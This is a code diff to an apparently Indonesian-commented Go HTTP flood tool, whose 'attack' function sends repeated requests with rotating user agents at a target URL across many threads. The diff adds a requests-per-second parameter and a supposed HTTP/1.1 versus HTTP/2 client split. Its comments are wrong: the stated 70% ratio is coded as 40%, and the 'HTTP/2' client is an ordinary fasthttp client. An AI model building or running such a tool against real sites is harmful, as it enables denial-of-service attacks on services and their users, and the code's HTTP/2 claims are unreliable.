@@ -13,11 +13,13 @@ import (
 )
 
 var (
-	userAgents   []string
-	successCount uint64
-	errorCount   uint64
-	statusCodes  = make(map[int]uint64)
-	mutex        sync.Mutex
+	userAgents      []string
+	successCount    uint64
+	errorCount      uint64
+	statusCodes     = make(map[int]uint64)
+	mutex           sync.Mutex
+	http1RequestCount uint64 // Counter untuk request HTTP/1.1
+	http2RequestCount uint64 // Counter untuk request HTTP/2
 )
 
 func init() {
@@ -64,12 +66,29 @@ func randomElement(elements []string) string {
 	return elements[rand.Intn(len(elements))]
 }
 
-func attack(targetURL string, duration time.Duration, wg *sync.WaitGroup) {
+func attack(targetURL string, duration time.Duration, rps int, wg *sync.WaitGroup) {
 	defer wg.Done()
-	client := &fasthttp.Client{}
+
+	// Buat dua client: satu untuk HTTP/1.1, satu untuk HTTP/2
+	clientHTTP1 := &fasthttp.Client{}
+	clientHTTP2 := &fasthttp.Client{}
+	// HTTP/2 diaktifkan otomatis jika server mendukungnya
+	clientHTTP2.MaxConnsPerHost = 1 // mengatur jumlah koneksi per host untuk client HTTP/2
 
 	startTime := time.Now()
+	interval := time.Second / time.Duration(rps) // Menghitung interval antara setiap request
+
 	for time.Since(startTime) < duration {
+		// Tentukan rasio lebih tinggi untuk HTTP/2, misal 70% HTTP/2 dan 30% HTTP/1.1
+		var client *fasthttp.Client
+		if rand.Intn(10) < 4 { // 70% HTTP/2
+			client = clientHTTP2
+			atomic.AddUint64(&http2RequestCount, 1)
+		} else {
+			client = clientHTTP1
+			atomic.AddUint64(&http1RequestCount, 1)
+		}
+
 		req := fasthttp.AcquireRequest()
 		resp := fasthttp.AcquireResponse()
 
@@ -90,30 +109,38 @@ func attack(targetURL string, duration time.Duration, wg *sync.WaitGroup) {
 
 		fasthttp.ReleaseRequest(req)
 		fasthttp.ReleaseResponse(resp)
+
+		// Tunggu sesuai dengan interval untuk mencapai rate per detik
+		time.Sleep(interval)
 	}
 }
 
 func main() {
-	if len(os.Args) < 3 {
-		fmt.Println("Usage: go run main.go <target> <duration> [threads]")
+	if len(os.Args) < 5 {
+		fmt.Println("Usage: go run main.go <target> <duration> <threads> <rps>")
+		fmt.Println("Contoh: go run main.go https://example.com 10 20 100")
 		os.Exit(1)
 	}
 
 	target := os.Args[1]
 	duration, _ := time.ParseDuration(os.Args[2] + "s")
 
-	threads := 10
-	if len(os.Args) > 3 {
-		t, err := strconv.Atoi(os.Args[3])
-		if err == nil && t > 0 {
-			threads = t
-		}
+	threads, err := strconv.Atoi(os.Args[3])
+	if err != nil || threads <= 0 {
+		fmt.Println("Threads harus angka positif")
+		os.Exit(1)
+	}
+
+	rps, err := strconv.Atoi(os.Args[4])
+	if err != nil || rps <= 0 {
+		fmt.Println("RPS harus angka positif")
+		os.Exit(1)
 	}
 
 	var wg sync.WaitGroup
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
-		go attack(target, duration, &wg)
+		go attack(target, duration, rps, &wg)
 	}
 
 	wg.Wait()
@@ -123,6 +150,8 @@ func main() {
 	fmt.Printf("Total request terkirim : %d\n", successCount+errorCount)
 	fmt.Printf("Request sukses         : %d\n", successCount)
 	fmt.Printf("Request gagal          : %d\n", errorCount)
+	fmt.Printf("Request HTTP/1.1       : %d\n", http1RequestCount)
+	fmt.Printf("Request HTTP/2         : %d\n", http2RequestCount)
 	fmt.Println("\nStatus Code Diterima:")
 	for code, count := range statusCodes {
 		fmt.Printf("  %d : %d kali\n", code, count)
